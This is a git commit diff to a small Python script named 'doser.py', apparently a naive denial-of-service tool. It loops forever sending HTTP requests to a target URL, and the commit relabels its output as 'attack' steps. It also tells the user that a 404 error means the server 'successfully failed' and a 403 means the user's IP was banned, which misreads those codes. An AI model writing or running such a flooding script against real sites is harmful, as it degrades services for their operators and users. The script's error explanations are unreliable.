9d220bf19f2c027c233a92ed19643b73dde21b00
junior-python-coder <levon12341@gmail.com>
2016-10-27 20:50:54 +0300

    Update doser.py

--- doser.py
+++ doser.py
@@ -9,15 +9,17 @@ d=''
 while True:
 	try:
 		requests.get(url)
-		print('досим '+str(i)+': '+url)
+		print('attack '+str(i)+'-step: '+url)
 	except:
-		print("Request didn't connect to server. It means:\n1)server was successfully break")
-		print("2) server with sequrity")
+		print("Request didn't connect to server. It means:\n 1)if error=404 it means that server have successfully failed.")
+		input()
+		print("2)if error=403 it means that server with sequrity and your ip was baned. Sorry.")
+		input()
 		print("do you want to check what mean?[y/n]")
 		d=input()
 		if(d=='y'):
 			webbrowser.open(url)
 		else:
-			print('good bye...')
+			print('good bye my dear friend...')
 		break
 	i+=1
